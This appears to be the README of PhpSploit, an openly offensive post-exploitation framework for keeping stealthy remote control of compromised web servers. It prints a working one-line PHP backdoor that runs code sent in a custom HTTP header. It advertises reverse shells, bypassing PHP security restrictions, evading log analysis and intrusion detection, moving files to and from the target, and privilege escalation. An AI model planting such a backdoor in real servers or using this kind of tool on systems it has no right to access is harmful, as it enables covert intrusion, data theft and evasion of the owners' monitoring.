### PhpSploit: *Furtive post-exploitation framework* ###

PhpSploit is a **remote control** framework, aiming to provide a **stealth**
interactive shell-like connection over HTTP between client and web server.
It is a post-exploitation tool capable to maintain access to a
compromised web server for **privilege escalation** purposes.

[![Build Status](https://travis-ci.org/nil0x42/phpsploit.svg?branch=master)](https://travis-ci.org/nil0x42/phpsploit)

![][picture]

---------------------------------------------------------------------
#### Overview ####

The obfuscated communication is accomplished using HTTP headers under
standard client requests and web server's relative responses, tunneled
through a tiny **polymorphic backdoor**:

```php
<?php @eval($_SERVER['HTTP_PHPSPL01T']); ?>
```

---------------------------------------------------------------------
#### Features ####

* **Efficient**: More than 20 plugins to automate post-exploitation tasks
    - Run commands and browse filesystem, bypassing PHP security restrictions
    - Upload/Download files between client and target
    - Edit remote files through local text editor
    - Run SQL console on target system
    - Spawn reverse TCP shells

* **Stealth**: The framework is made by paranoids, for paranoids
    - Nearly invisible by log analysis and NIDS signature detection
    - Safe-mode and common *PHP security restrictions bypass*
    - Communications are hidden in HTTP Headers
    - Loaded payloads are obfuscated to *bypass NIDS*
    - http/https/socks4/socks5 **Proxy support**

* **Convenient**: A robust interface with many crucial features
    - Detailed help for any command or option (type `help`)
    - *Cross-platform* on both the client and the server.
    - Powerful interface with completion and multi-command support
    - Session saving/loading feature & persistent history
    - Multi-request support for large payloads (such as uploads)
    - Provides a powerful, highly configurable settings engine
    - Each setting, such as user-agent has a *polymorphic mode*
    - Customisable environment variables for plugin interaction
    - Provides a complete plugin development API


---------------------------------------------------------------------
#### Supported platforms (as attacker): ####
* GNU/Linux
* Mac OS X

#### Supported platforms (as target): ####
* GNU/Linux
* BSD Like
* Mac OS X
* Windows NT


## [Get started now !] ##


[picture]: data/img/phpsploit-demo.png
[Get started now !]: https://github.com/nil0x42/phpsploit/wiki
